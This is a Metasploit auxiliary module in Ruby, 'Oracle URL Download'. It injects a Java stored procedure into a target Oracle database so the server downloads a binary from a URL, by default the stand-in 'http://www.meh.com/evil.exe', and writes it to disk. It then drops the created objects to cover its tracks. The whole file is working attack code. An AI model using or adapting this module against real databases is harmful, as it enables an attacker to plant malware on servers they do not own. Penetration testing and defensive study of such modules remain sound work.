##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::ORACLE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle URL Download',
			'Description'    => %q{
					This module will create a java class which enables the download
				of a binary from a webserver to the oracle filesystem.
			},
			'Author'         => [ 'CG' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://www.argeniss.com/research/oraclesqlinj.zip' ],
				],
			'DisclosureDate' => 'Feb 10 2005'))

			register_options(
				[
					OptString.new('URL', [ false, 'The URL to download the binary from.',  'http://www.meh.com/evil.exe']),
					OptString.new('COPYTO', [ false, 'Location to copy the binary to',  'c:\\meh.exe']),
				], self.class)
	end

	def run
		return if not check_dependencies

		java = <<-EOF
CREATE OR REPLACE JAVA SOURCE NAMED SRC_FILE_UPLOAD AS
import java.lang.*;
import java.io.*;
public class FileUpload
{
	public static void fileUpload(String myFile, String url) throws IOException
	{
		File binaryFile = new File(myFile);
		FileOutputStream outStream = new  FileOutputStream(binaryFile);
		java.net.URL u = new java.net.URL(url);
		java.net.URLConnection uc = u.openConnection();
		InputStream is = (InputStream)uc.getInputStream();
		BufferedReader in = new BufferedReader (new InputStreamReader (is));
		byte buffer[] = new byte[1024];
		int length = -1;
		while ((length = is.read(buffer)) != -1) {
			outStream.write(buffer, 0, length);
			outStream.flush();
		}
		is.close(); outStream.close();
	}
};;
EOF

		procedure = <<-EOF
CREATE OR REPLACE PROCEDURE PROC_FILEUPLOAD (p_file varchar2, p_url varchar2)
as language java
NAME 'FileUpload.fileUpload (java.lang.String, java.lang.String)';
EOF

		exec      = "begin PROC_FILEUPLOAD ('#{datastore['COPYTO']}', '#{datastore['URL']}'); end;"

		drops     = "drop java source SRC_FILE_UPLOAD"

		dropp     = "drop procedure PROC_FILEUPLOAD"

		begin
			print_status("Creating java source 'SRC_FILE_UPLOAD'...")
			prepare_exec(java)
		rescue => e
			return
		end

		print_status("Creating procedure 'PROC_FILEUPLOAD'...")
		prepare_exec(procedure)

		print_status("Trying to download binary from #{datastore['URL']} to #{datastore['COPYTO']}")
		prepare_exec(exec)

		print_status("Removing java source 'SRC_FILE_UPLOAD'...")
		prepare_exec(drops)

		print_status("Removing procedure 'PROC_FILEUPLOAD'...")
		prepare_exec(dropp)

	end

end
